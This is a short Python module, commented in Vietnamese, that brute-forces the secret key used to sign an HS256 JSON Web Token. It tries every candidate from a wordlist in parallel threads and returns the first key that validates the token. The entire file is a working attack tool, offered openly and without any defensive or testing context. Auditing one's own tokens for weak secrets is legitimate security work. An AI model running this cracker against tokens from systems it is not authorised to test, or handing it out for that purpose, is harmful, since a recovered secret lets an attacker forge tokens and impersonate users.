"""
Module JWTCracker.

Thu brute force khoa bi mat (secret) dung de ky JWT bang cach duyet qua
mot wordlist. Su dung ThreadPoolExecutor de thu nhieu khoa song song.
"""

import jwt
from concurrent.futures import ThreadPoolExecutor


class JWTCracker:
    """Bo do khoa bi mat yeu cua JWT dua tren tu dien (wordlist)."""

    def __init__(self, token, wordlist_path):
        self.token = token
        self.wordlist_path = wordlist_path

    def _try_secret(self, secret):
        """Thu giai ma token voi mot khoa. Dung -> tra ve khoa, sai -> None."""
        try:
            jwt.decode(self.token, secret, algorithms=["HS256"])
            return secret
        except jwt.InvalidTokenError:
            return None

    def crack(self):
        # Doc toan bo khoa ung vien tu wordlist.
        with open(self.wordlist_path, "r") as f:
            secrets = f.read().splitlines()

        # Thu song song cac khoa de tang toc.
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(self._try_secret, secrets)

        # Tra ve khoa dung dau tien tim duoc.
        for result in results:
            if result:
                return result

        return None
